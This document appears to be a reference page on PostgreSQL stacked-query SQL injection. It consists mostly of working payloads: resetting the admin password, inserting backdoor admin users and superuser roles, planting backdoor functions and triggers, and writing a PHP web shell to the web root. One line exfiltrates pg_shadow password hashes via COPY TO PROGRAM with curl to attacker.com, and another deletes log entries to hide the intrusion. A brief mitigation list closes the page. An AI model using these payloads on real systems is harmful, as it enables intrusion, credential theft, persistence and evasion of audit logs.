---
title: Stacked Queries
description: Executing multiple SQL statements in a single injection
category: Injection Techniques
order: 14
tags: ["stacked queries", "multiple statements", "advanced injection"]
lastUpdated: 2025-12-07
---

## Stacked Queries

Stacked queries (also known as query stacking or multi-queries) allow attackers to execute multiple SQL statements in a single injection. PostgreSQL fully supports stacked queries, making it a powerful target for this technique.

### Basic Syntax

In PostgreSQL, multiple SQL statements are separated by semicolons (`;`):

```sql
SELECT * FROM users; DROP TABLE users;
```

### Detection

To test if stacked queries are possible:

```sql
'; SELECT pg_sleep(5)--
```

If the application pauses for 5 seconds, it likely supports stacked queries.

### Prerequisites

Stacked queries work in PostgreSQL when:

1. The database driver supports multiple statements
2. The application doesn't filter semicolons
3. Common drivers that support stacked queries:
   - psycopg2 (Python) - with certain configurations
   - node-postgres (Node.js)
   - JDBC PostgreSQL driver
   - PHP pg_query with multiple statements

### Examples of Stacked Queries

#### Data Modification

```sql
'; UPDATE users SET password='hacked' WHERE username='admin'--
```

#### Creating New User

```sql
'; INSERT INTO users (username, password, role) VALUES ('attacker', 'password123', 'admin')--
```

#### Privilege Escalation

```sql
'; UPDATE users SET role='admin' WHERE username='guest'--
```

#### Schema Manipulation

```sql
'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255)--
```

### Advanced Exploitation

#### Creating Functions

```sql
'; CREATE OR REPLACE FUNCTION backdoor() RETURNS void AS $$
BEGIN
    EXECUTE 'COPY (SELECT * FROM users) TO ''/tmp/dump.txt''';
END;
$$ LANGUAGE plpgsql--
```

#### Creating Triggers

```sql
'; CREATE TRIGGER evil_trigger
AFTER INSERT ON users
FOR EACH ROW
EXECUTE FUNCTION backdoor()--
```

#### Using COPY for Data Exfiltration

```sql
'; COPY (SELECT * FROM users) TO '/tmp/users.csv'--
```

#### Writing Web Shells

```sql
'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'--
```

### Out-of-Band Data Extraction

Using `COPY ... TO PROGRAM`:

```sql
'; COPY (SELECT passwd FROM pg_shadow) TO PROGRAM 'curl http://attacker.com/?data=$(cat)'--
```

### Creating Roles

```sql
-- Create superuser (requires privileges)
'; CREATE ROLE attacker WITH LOGIN PASSWORD 'password' SUPERUSER--

-- Grant privileges
'; GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO attacker--
```

### Practical Attack Pattern

```sql
-- Comprehensive attack
';
-- Check current privileges
SELECT current_user, current_setting('is_superuser');
-- Create backup of target table
CREATE TABLE users_backup AS SELECT * FROM users;
-- Insert backdoor user
INSERT INTO users (username, password, role) VALUES ('backdoor', 'secret', 'admin');
-- Clean up traces
DELETE FROM logs WHERE action LIKE '%backdoor%';
--
```

### Bypassing Filters

PostgreSQL requires semicolons as statement separators - newlines alone do not terminate statements. If semicolons are blocked, alternatives for stacked queries are very limited.

One possible workaround is using dollar-quoting inside function definitions, where the function body can contain semicolon-separated statements:

```sql
-- Dollar-quoting allows semicolons inside the function body
'; CREATE FUNCTION exec() RETURNS void AS $$
  INSERT INTO logs VALUES ('test');
  UPDATE users SET role='admin' WHERE id=1;
$$ LANGUAGE SQL;
SELECT exec()--
```

Note: This still requires a semicolon after the function definition to execute a subsequent `SELECT exec()` call, so it's not a true bypass - it only helps if the filter is weak or context-specific.

### Limitations

1. Some application frameworks explicitly disable multi-statement queries
2. ORMs often prevent stacked queries
3. Connection poolers may have restrictions
4. WAFs may block semicolons in input

### Mitigation

To prevent stacked query attacks:

1. Use parameterized queries/prepared statements
2. Disable multi-statement support in database drivers
3. Implement proper input validation
4. Use least-privilege database accounts
5. Deploy a WAF to detect SQL injection patterns
